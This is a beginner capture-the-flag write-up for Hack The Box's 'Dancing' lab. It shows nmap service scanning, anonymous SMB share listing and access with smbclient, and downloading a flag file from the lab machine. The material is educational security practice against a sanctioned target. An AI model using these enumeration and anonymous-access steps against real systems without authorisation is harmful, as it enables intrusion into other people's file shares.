# Hack The Box Starting Point: Dancing

## Objective

The goal of this lab was to practice basic SMB enumeration, identify accessible network shares, and retrieve the flag from the target machine.

## Target Information

* Platform: Hack The Box
* Machine: Dancing
* Difficulty: Starting Point / Beginner
* Target OS: Windows
* Main Service Explored: SMB

## Tools Used

* `ping`
* `nmap`
* `smbclient`
* Basic Linux commands: `ls`, `cd`, `get`, `cat`

## Enumeration

I first confirmed that the target machine was reachable by sending a ping request.

```bash
ping <target-ip>
```

This confirmed that the machine was online and responding.

Next, I ran an Nmap scan to identify open ports and services.

```bash
nmap -sV <target-ip>
```

The scan showed the following open ports:

```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

The presence of ports `139` and `445` indicated that SMB was available on the target.

## SMB Enumeration

Since SMB is used for file and printer sharing, I checked whether the target had any accessible shares.

```bash
smbclient -L //<target-ip>/ -N
```

Command breakdown:

* `smbclient` is used to interact with SMB shares.
* `-L` lists available shares on the target.
* `//<target-ip>/` specifies the target machine.
* `-N` attempts to connect without a password.

The available shares included:

```text
ADMIN$
C$
IPC$
WorkShares
```

`ADMIN$`, `C$`, and `IPC$` are default Windows administrative shares. The custom share, `WorkShares`, stood out as the most interesting target.

## Accessing the Share

I connected to the `WorkShares` share anonymously.

```bash
smbclient //<target-ip>/WorkShares -N
```

After connecting, I listed the contents of the share.

```bash
ls
```

The share contained user directories, including folders for different users. I navigated through the directories using:

```bash
cd "Directory Name"
```

The quotes were needed because some folder names contained spaces.

## Flag Retrieval

After checking the available directories, I found `flag.txt`.

I downloaded the file using:

```bash
get flag.txt
```

Then I exited the SMB session:

```bash
exit
```

Back in my local Kali terminal, I confirmed the file was downloaded and read its contents:

```bash
ls
cat flag.txt
```

The flag was successfully retrieved and submitted on Hack The Box.

## Key Takeaways

* Ports `139` and `445` are strong indicators that SMB may be available.
* SMB shares can be enumerated using `smbclient`.
* Default administrative shares such as `ADMIN$`, `C$`, and `IPC$` are usually restricted.
* Custom shares are often more useful targets during enumeration.
* Anonymous SMB access should always be checked during beginner enumeration labs.
* Folder names with spaces should be wrapped in quotes when navigating from the SMB prompt.

## Summary

In this lab, I practiced identifying SMB services, listing available shares, distinguishing default Windows shares from a custom share, accessing an SMB share anonymously, navigating directories, and retrieving a flag file.
